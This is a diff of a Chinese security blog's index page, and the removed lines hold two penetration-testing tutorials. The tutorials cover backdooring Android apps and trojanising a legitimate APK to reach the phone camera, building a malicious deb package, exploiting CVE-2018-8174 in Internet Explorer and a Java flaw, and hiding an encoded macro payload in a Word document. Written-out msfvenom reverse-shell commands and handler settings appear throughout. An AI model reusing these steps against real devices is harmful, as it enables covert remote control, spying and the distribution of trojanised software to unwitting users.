+<p>步骤5：提权（过程略）</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="/2021/11/26/%E4%B8%AD%E9%97%B4%E4%BB%B6PUT%E6%BC%8F%E6%B4%9E/image-20211101193759180.png" alt="image-20211101193759180"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -1638,498 +1982,10 @@ int main()
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="北极星上的稻草人">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="北极星上的稻草人">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/" class="post-title-link" itemprop="url">Android客户端渗透</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-08-18 18:29:35" itemprop="dateCreated datePublished" datetime="2021-08-18T18:29:35+08:00">2021-08-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-10-08 10:36:02" itemprop="dateModified" datetime="2021-10-08T10:36:02+08:00">2021-10-08</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="Android客户端渗透"><a href="#Android客户端渗透" class="headerlink" title="Android客户端渗透"></a>Android客户端渗透</h1><h2 id="一、back-door程序渗透Android"><a href="#一、back-door程序渗透Android" class="headerlink" title="一、back door程序渗透Android"></a>一、back door程序渗透Android</h2><p>步骤1：使用MSF生成一个apk的back door应用程序</p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162007668.png" alt="image-20210818162007668"></p>
-<p>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.53 LPORT=4444 R &gt;xuegod.apk</p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162243078.png" alt="image-20210818162243078"></p>
-<p>步骤2：监听</p>
-<p>启动msf</p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162413014.png" alt="image-20210818162413014"></p>
-<p>加载渗透模块并配置参数</p>
-<p>use exploit/multi/handler</p>
-<p>set payload android/meterpreter/reverse_tcp</p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162558054.png" alt="image-20210818162558054"></p>
-<p>步骤3：</p>
-<p>手机端下载并打开程序</p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162318121.png" alt="image-20210818162318121"></p>
-<p>kali端，会话建立成功</p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162707785.png" alt="image-20210818162707785"></p>
-<p>操控命令说明补充：</p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162741892.png" alt="image-20210818162741892"></p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162808076.png" alt="image-20210818162808076"></p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162903481.png" alt="image-20210818162903481"></p>
-<p>二、将木马隐藏到正版app中<br>说明：请勿在Kali2019.4版本中操作，可能存在兼容问题</p>
-<p><strong>步骤1：搭建环境</strong></p>
-<p>禁用ipv6</p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163134441.png" alt="image-20210818163134441"></p>
-<p>下载工具</p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163211629.png" alt="image-20210818163211629"></p>
-<p>解压文件</p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163316767.png" alt="image-20210818163316767"></p>
-<p>解压结果</p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163357630.png" alt="image-20210818163357630"></p>
-<p>修改程序</p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163458535.png" alt="image-20210818163458535"></p>
-<p><strong>步骤2：</strong>注入back door到apk</p>
-<p>载入要注入back door的apk和apktool.jar工具到kali（注意路径）</p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163928062.png" alt="image-20210818163928062"></p>
-<p>进入apk工具（这里用到逆向与注入）</p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164112162.png" alt="image-20210818164112162"></p>
-<p>选择第3项（输入3)，然后配置参数</p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164734783.png" alt="image-20210818164734783"></p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164643208.png" alt="image-20210818164643208"></p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164805027.png" alt="image-20210818164805027"></p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164849132.png" alt="image-20210818164849132"></p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818165009619.png" alt="image-20210818165009619"></p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818165125523.png" alt="image-20210818165125523"></p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170027865.png" alt="image-20210818170027865"></p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170140902.png" alt="image-20210818170140902"></p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170211040.png" alt="image-20210818170211040"></p>
-<p>补充：</p>
-<p>出错情况1：</p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164416940.png" alt="image-20210818164416940"></p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164435145.png" alt="image-20210818164435145"></p>
-<p>出错情况2：</p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818165254757.png" alt="image-20210818165254757"></p>
-<p>解决方法</p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818165616957.png" alt="image-20210818165616957"></p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818165818720.png" alt="image-20210818165818720"></p>
-<p>步骤3：手动启动msf的监听（该步骤非必须，也可以用它自带的，如步骤2结果）</p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162413014.png" alt="image-20210818162413014"></p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162558054.png" alt="image-20210818162558054"></p>
-<p>步骤4：启动apache2服务</p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170535594.png" alt="image-20210818170535594"></p>
-<p>把apk放到根目录方便下载</p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170632278.png" alt="image-20210818170632278"></p>
-<p>步骤5：Android手机下载并安装apk</p>
-<p>安装过程略，启动运行软件后</p>
-<p>直接上结果</p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170902403.png" alt="image-20210818170902403"></p>
-<p>补充：</p>
-<p>启动摄像头</p>
-<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170957413.png" alt="image-20210818170957413"></p>
-<p>注意：手机端会提示是是否打开摄像头</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="北极星上的稻草人">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="北极星上的稻草人">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/" class="post-title-link" itemprop="url">利用deb包-0day-java环境进行渗透</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-08-18 16:17:01" itemprop="dateCreated datePublished" datetime="2021-08-18T16:17:01+08:00">2021-08-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-10-08 11:16:10" itemprop="dateModified" datetime="2021-10-08T11:16:10+08:00">2021-10-08</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="利用deb包-0day-java环境进行渗透"><a href="#利用deb包-0day-java环境进行渗透" class="headerlink" title="利用deb包-0day-java环境进行渗透"></a>利用deb包-0day-java环境进行渗透</h1><h2 id="一、制作恶意deb软件包来触发back-door"><a href="#一、制作恶意deb软件包来触发back-door" class="headerlink" title="一、制作恶意deb软件包来触发back door"></a>一、制作恶意deb软件包来触发back door</h2><p><strong>以freesweep软件包为例子</strong> </p>
-<p>步骤1：下载正版的freesweep软件包</p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817154438382.png" alt="image-20210817154438382"></p>
-<p>步骤2：</p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817154803409.png" alt="image-20210817154803409"></p>
-<p><strong>命令说明</strong>：把EOF重定向（写入）到/root/free/DEBIAN/control里；EOF是指其下一行开始到最后EOF那一行的所有内容</p>
-<p><strong>补充</strong>：也可以进入目录用vim写入，如下</p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817154555203.png" alt="image-20210817154555203"></p>
-<p>确保路径存在（目录不存在，则要自己创建），注意大小写、顺序。</p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817154651297.png" alt="image-20210817154651297"></p>
-<p>步骤3：创建deb软件包，安装后脚步文件来加载back door</p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817155435610.png" alt="image-20210817155435610"></p>
-<p>设置文件执行权限</p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817155637985.png" alt="image-20210817155637985"></p>
-<p>重新打包软件包</p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817155808883.png" alt="image-20210817155808883"></p>
-<p>说明：文件夹叫什么名，打包出来的软件包就叫什么名</p>
-<p>步骤4：效果演示</p>
-<p><strong>监听</strong></p>
-<p>环境：一台kali（自己监听自己）</p>
-<p>进入msf</p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160019739.png" alt="image-20210817160019739"></p>
-<p>加载监听模块并配置参数</p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160301457.png" alt="image-20210817160301457"></p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160347828.png" alt="image-20210817160347828"></p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160457759.png" alt="image-20210817160457759"></p>
-<p>打开另外一个控制台安装软件包</p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160543619.png" alt="image-20210817160543619"></p>
-<p>结果：会话建立成功</p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160622947.png" alt="image-20210817160622947"></p>
-<p>补充：软件包被卸载后，会话会自动断开</p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160756710.png" alt="image-20210817160756710"></p>
-<h2 id="二、利用0DAY漏洞CVE-2018-8174获取shell"><a href="#二、利用0DAY漏洞CVE-2018-8174获取shell" class="headerlink" title="二、利用0DAY漏洞CVE-2018-8174获取shell"></a>二、利用0DAY漏洞CVE-2018-8174获取shell</h2><p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817165222216.png" alt="image-20210817165222216"></p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817165327932.png" alt="image-20210817165327932"></p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817165542797.png" alt="image-20210817165542797"></p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817165853688.png" alt="image-20210817165853688"></p>
-<p>将恶意文件拷贝到web根目录下，</p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170035572.png" alt="image-20210817170035572"></p>
-<p>开启apache服务</p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170128424.png" alt="image-20210817170128424"></p>
-<p>加载和配置模块</p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170259965.png" alt="image-20210817170259965"></p>
-<p>在window下启动恶意文件，要注意payload设置</p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170320356.png" alt="image-20210817170320356"></p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170330785.png" alt="image-20210817170330785"></p>
-<p>启动，监听</p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170444127.png" alt="image-20210817170444127"></p>
-<p>3.启动恶意文件</p>
-<p>注意：该漏洞针对的是ie浏览器和IE内核的浏览器（如360浏览器）</p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170646899.png" alt="image-20210817170646899"></p>
-<p>结果</p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170726851.png" alt="image-20210817170726851"></p>
-<h2 id="三、基于java环境的漏洞获取shell"><a href="#三、基于java环境的漏洞获取shell" class="headerlink" title="三、基于java环境的漏洞获取shell"></a>三、基于java环境的漏洞获取shell</h2><p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818101510091.png" alt="image-20210818101510091"></p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818101548466.png" alt="image-20210818101548466"></p>
-<p>说明：该漏洞与jre的版本有关，其他版本可能不行</p>
-<p>步骤1：加载模块</p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818101727843.png" alt="image-20210818101727843"></p>
-<p>步骤2：配置payload并启动</p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818101835440.png" alt="image-20210818101835440"></p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818101854499.png" alt="image-20210818101854499"></p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818101932255.png" alt="image-20210818101932255"></p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818102202346.png" alt="image-20210818102202346"></p>
-<p>补充：需要打开apache2服务</p>
-<p>步骤3：可能会弹出的提示框操作与结果展示</p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818102503192.png" alt="image-20210818102503192"></p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818102538395.png" alt="image-20210818102538395"></p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818102625422.png" alt="image-20210818102625422"></p>
-<p>结果（会话可能后台运行了）</p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818102811873.png" alt="image-20210818102811873"></p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818102839600.png" alt="image-20210818102839600"></p>
-<h2 id="四、利用宏感染word文档获取shell"><a href="#四、利用宏感染word文档获取shell" class="headerlink" title="四、利用宏感染word文档获取shell"></a>四、利用宏感染word文档获取shell</h2><p>步骤1：生成宏恶意文件</p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818103109953.png" alt="image-20210818103109953"></p>
-<p>指令：msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.53 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f vba-exe</p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818104623212.png" alt="image-20210818104623212"></p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818104647745.png" alt="image-20210818104647745"></p>
-<p>将上面这段代码放到word里的宏。</p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818104807569.png" alt="image-20210818104807569"></p>
-<p>payload放到文件内容（将其隐藏）</p>
-<p>如图操作</p>
-<p>宏设置：</p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105017122.png" alt="image-20210818105017122"></p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105121898.png" alt="image-20210818105121898"></p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105236492.png" alt="image-20210818105236492"></p>
-<p>payload操作：</p>
-<p>将kali生成的payload代码放入刚保存的带宏的文件中</p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105437540.png" alt="image-20210818105437540"></p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105600439.png" alt="image-20210818105600439"></p>
-<p>隐藏效果</p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105613376.png" alt="image-20210818105613376"></p>
-<p>再在前面输入正常内容</p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105658221.png" alt="image-20210818105658221"></p>
-<p>步骤2：监听</p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105902905.png" alt="image-20210818105902905"></p>
-<p>LHOST是指监听者的ip地址</p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105925383.png" alt="image-20210818105925383"></p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105957052.png" alt="image-20210818105957052"></p>
-<p>步骤3：效果</p>
-<p>目标机打开文件</p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818110059162.png" alt="image-20210818110059162"></p>
-<p>攻击者</p>
-<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818110159404.png" alt="image-20210818110159404"></p>
-<p>补充：该文件如果发到其他主机，其他主机也可能会被感染/遭受攻击</p>
-<p><strong>应对方法</strong>：安装杀毒软件，杀毒软件会发出警告或杀掉木马。也可以查看宏来判断</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
